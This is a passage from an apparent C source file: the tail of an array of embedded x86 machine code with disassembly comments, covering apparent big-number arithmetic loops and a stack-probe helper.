  /* 14B8 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 14BA */ "\x39\x75\xfc"                             /* cmp [ebp-0x4], esi               */
  /* 14BD */ "\x7e\x43"                                 /* jle 0x1502                       */
  /* 14BF */ "\x56"                                     /* push esi                         */
  /* 14C0 */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 14C3 */ "\xe8\xd6\xfd\xff\xff"                     /* call 0x129e                      */
  /* 14C8 */ "\x59"                                     /* pop ecx                          */
  /* 14C9 */ "\x59"                                     /* pop ecx                          */
  /* 14CA */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 14CC */ "\x74\x1a"                                 /* jz 0x14e8                        */
  /* 14CE */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 14D1 */ "\x8d\x85\xfc\xdf\xff\xff"                 /* lea eax, [ebp-0x2004]            */
  /* 14D7 */ "\x50"                                     /* push eax                         */
  /* 14D8 */ "\x8d\x85\xfc\xbf\xff\xff"                 /* lea eax, [ebp-0x4004]            */
  /* 14DE */ "\x50"                                     /* push eax                         */
  /* 14DF */ "\x50"                                     /* push eax                         */
  /* 14E0 */ "\xe8\x52\xff\xff\xff"                     /* call 0x1437                      */
  /* 14E5 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 14E8 */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 14EB */ "\x8d\x85\xfc\xdf\xff\xff"                 /* lea eax, [ebp-0x2004]            */
  /* 14F1 */ "\x50"                                     /* push eax                         */
  /* 14F2 */ "\x50"                                     /* push eax                         */
  /* 14F3 */ "\x50"                                     /* push eax                         */
  /* 14F4 */ "\xe8\x3e\xff\xff\xff"                     /* call 0x1437                      */
  /* 14F9 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 14FC */ "\x46"                                     /* inc esi                          */
  /* 14FD */ "\x3b\x75\xfc"                             /* cmp esi, [ebp-0x4]               */
  /* 1500 */ "\x7c\xbd"                                 /* jl 0x14bf                        */
  /* 1502 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 1505 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 1507 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 1509 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 150B */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 150E */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 1510 */ "\x8d\xb5\xfc\xbf\xff\xff"                 /* lea esi, [ebp-0x4004]            */
  /* 1516 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 1518 */ "\x5f"                                     /* pop edi                          */
  /* 1519 */ "\x5e"                                     /* pop esi                          */
  /* 151A */ "\x5b"                                     /* pop ebx                          */
  /* 151B */ "\xc9"                                     /* leave                            */
  /* 151C */ "\xc3"                                     /* ret                              */
  /* 151D */ "\x55"                                     /* push ebp                         */
  /* 151E */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 1520 */ "\xb8\x04\x40\x00\x00"                     /* mov eax, 0x4004                  */
  /* 1525 */ "\xe8\xb6\x00\x00\x00"                     /* call 0x15e0                      */
  /* 152A */ "\x53"                                     /* push ebx                         */
  /* 152B */ "\x56"                                     /* push esi                         */
  /* 152C */ "\x57"                                     /* push edi                         */
  /* 152D */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 1530 */ "\xe8\x82\xfd\xff\xff"                     /* call 0x12b7                      */
  /* 1535 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 1538 */ "\xbb\x04\x04\x00\x00"                     /* mov ebx, 0x404                   */
  /* 153D */ "\x89\x45\xfc"                             /* mov [ebp-0x4], eax               */
  /* 1540 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 1542 */ "\x59"                                     /* pop ecx                          */
  /* 1543 */ "\x8d\xbd\xfc\xbf\xff\xff"                 /* lea edi, [ebp-0x4004]            */
  /* 1549 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 154B */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 154D */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 1553 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 1555 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 1557 */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 155D */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 155F */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 1561 */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 1567 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 1569 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 156B */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 156D */ "\xc7\x85\xfc\xbf\xff\xff\x01\x00\x00\x00" /* mov dword [ebp-0x4004], 0x1      */
  /* 1577 */ "\x39\x75\xfc"                             /* cmp [ebp-0x4], esi               */
  /* 157A */ "\x7e\x43"                                 /* jle 0x15bf                       */
  /* 157C */ "\x56"                                     /* push esi                         */
  /* 157D */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 1580 */ "\xe8\x19\xfd\xff\xff"                     /* call 0x129e                      */
  /* 1585 */ "\x59"                                     /* pop ecx                          */
  /* 1586 */ "\x59"                                     /* pop ecx                          */
  /* 1587 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 1589 */ "\x74\x1a"                                 /* jz 0x15a5                        */
  /* 158B */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 158E */ "\x8d\x85\xfc\xdf\xff\xff"                 /* lea eax, [ebp-0x2004]            */
  /* 1594 */ "\x50"                                     /* push eax                         */
  /* 1595 */ "\x8d\x85\xfc\xbf\xff\xff"                 /* lea eax, [ebp-0x4004]            */
  /* 159B */ "\x50"                                     /* push eax                         */
  /* 159C */ "\x50"                                     /* push eax                         */
  /* 159D */ "\xe8\xc8\xfe\xff\xff"                     /* call 0x146a                      */
  /* 15A2 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 15A5 */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 15A8 */ "\x8d\x85\xfc\xdf\xff\xff"                 /* lea eax, [ebp-0x2004]            */
  /* 15AE */ "\x50"                                     /* push eax                         */
  /* 15AF */ "\x50"                                     /* push eax                         */
  /* 15B0 */ "\x50"                                     /* push eax                         */
  /* 15B1 */ "\xe8\xb4\xfe\xff\xff"                     /* call 0x146a                      */
  /* 15B6 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 15B9 */ "\x46"                                     /* inc esi                          */
  /* 15BA */ "\x3b\x75\xfc"                             /* cmp esi, [ebp-0x4]               */
  /* 15BD */ "\x7c\xbd"                                 /* jl 0x157c                        */
  /* 15BF */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 15C2 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 15C4 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 15C6 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 15C8 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 15CB */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 15CD */ "\x8d\xb5\xfc\xbf\xff\xff"                 /* lea esi, [ebp-0x4004]            */
  /* 15D3 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 15D5 */ "\x5f"                                     /* pop edi                          */
  /* 15D6 */ "\x5e"                                     /* pop esi                          */
  /* 15D7 */ "\x5b"                                     /* pop ebx                          */
  /* 15D8 */ "\xc9"                                     /* leave                            */
  /* 15D9 */ "\xc3"                                     /* ret                              */
  /* 15DA */ "\xcc"                                     /* int3                             */
  /* 15DB */ "\xcc"                                     /* int3                             */
  /* 15DC */ "\xcc"                                     /* int3                             */
  /* 15DD */ "\xcc"                                     /* int3                             */
  /* 15DE */ "\xcc"                                     /* int3                             */
  /* 15DF */ "\xcc"                                     /* int3                             */
  /* 15E0 */ "\x3d\x00\x10\x00\x00"                     /* cmp eax, 0x1000                  */
  /* 15E5 */ "\x73\x0e"                                 /* jae 0x15f5                       */
  /* 15E7 */ "\xf7\xd8"                                 /* neg eax                          */
  /* 15E9 */ "\x01\xe0"                                 /* add eax, esp                     */
  /* 15EB */ "\x83\xc0\x04"                             /* add eax, 0x4                     */
  /* 15EE */ "\x85\x00"                                 /* test [eax], eax                  */
  /* 15F0 */ "\x94"                                     /* xchg esp, eax                    */
  /* 15F1 */ "\x8b\x00"                                 /* mov eax, [eax]                   */
  /* 15F3 */ "\x50"                                     /* push eax                         */
  /* 15F4 */ "\xc3"                                     /* ret                              */
  /* 15F5 */ "\x51"                                     /* push ecx                         */
  /* 15F6 */ "\x8d\x4c\x24\x08"                         /* lea ecx, [esp+0x8]               */
  /* 15FA */ "\x81\xe9\x00\x10\x00\x00"                 /* sub ecx, 0x1000                  */
  /* 1600 */ "\x2d\x00\x10\x00\x00"                     /* sub eax, 0x1000                  */
  /* 1605 */ "\x85\x01"                                 /* test [ecx], eax                  */
  /* 1607 */ "\x3d\x00\x10\x00\x00"                     /* cmp eax, 0x1000                  */
  /* 160C */ "\x73\xec"                                 /* jae 0x15fa                       */
  /* 160E */ "\x29\xc1"                                 /* sub ecx, eax                     */
  /* 1610 */ "\x89\xe0"                                 /* mov eax, esp                     */
  /* 1612 */ "\x85\x01"                                 /* test [ecx], eax                  */
  /* 1614 */ "\x89\xcc"                                 /* mov esp, ecx                     */
  /* 1616 */ "\x8b\x08"                                 /* mov ecx, [eax]                   */
  /* 1618 */ "\x8b\x40\x04"                             /* mov eax, [eax+0x4]               */
  /* 161B */ "\x50"                                     /* push eax                         */
  /* 161C */ "\xc3"                                     /* ret                              */
  /* 161D */ "\x51"                                     /* push ecx                         */
  /* 161E */ "\x8d\x4c\x24\x08"                         /* lea ecx, [esp+0x8]               */
  /* 1622 */ "\x29\xc1"                                 /* sub ecx, eax                     */
  /* 1624 */ "\x83\xe1\x0f"                             /* and ecx, 0xf                     */
  /* 1627 */ "\x01\xc8"                                 /* add eax, ecx                     */
  /* 1629 */ "\x19\xc9"                                 /* sbb ecx, ecx                     */
  /* 162B */ "\x09\xc8"                                 /* or eax, ecx                      */
  /* 162D */ "\x59"                                     /* pop ecx                          */
  /* 162E */ "\xeb\xb0"                                 /* jmp 0x15e0                       */
  /* 1630 */ "\x51"                                     /* push ecx                         */
  /* 1631 */ "\x8d\x4c\x24\x08"                         /* lea ecx, [esp+0x8]               */
  /* 1635 */ "\x29\xc1"                                 /* sub ecx, eax                     */
  /* 1637 */ "\x83\xe1\x07"                             /* and ecx, 0x7                     */
  /* 163A */ "\x01\xc8"                                 /* add eax, ecx                     */
  /* 163C */ "\x19\xc9"                                 /* sbb ecx, ecx                     */
  /* 163E */ "\x09\xc8"                                 /* or eax, ecx                      */
  /* 1640 */ "\x59"                                     /* pop ecx                          */
  /* 1641 */ "\xeb\x9d"                                 /* jmp 0x15e0                       */
};